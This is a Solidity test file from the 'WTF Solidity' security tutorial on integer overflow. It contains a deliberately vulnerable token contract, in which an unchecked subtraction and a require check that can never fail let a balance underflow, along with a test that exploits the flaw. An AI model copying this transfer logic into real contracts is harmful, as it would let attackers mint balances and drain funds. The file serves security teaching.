// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;
import "forge-std/Test.sol";

/**
    WTF Solidity 合约安全: S05. 整型溢出

    ref https://www.wtf.academy/solidity-104/Overflow/

    command `forge test -vvv --contracts ./src/wtf/S05Overflow.sol`
 */
contract Token {
    mapping(address => uint) balances;
    uint public totalSupply;

    constructor(uint _initialSupply) {
        balances[msg.sender] = totalSupply = _initialSupply;
    }

    function transfer(address _to, uint _value) public returns (bool) {
        unchecked {
            require(balances[msg.sender] - _value >= 0);
            balances[msg.sender] -= _value;
            balances[_to] += _value;
        }
        return true;
    }

    function balanceOf(address _owner) public view returns (uint balance) {
        return balances[_owner];
    }
}

contract ContractTest is Test {
    function testOverflow() public {
        address alice = vm.addr(1);
        address bob = vm.addr(2);

        vm.startPrank(alice);
        Token token = new Token(100);
        assertEq(token.transfer(bob, 1000), true);
        assertEq(token.balanceOf(alice), type(uint256).max - 899);
        console.log(
            "Attacker balance(ether):",
            token.balanceOf(alice) / 1 ether
        );
    }
}
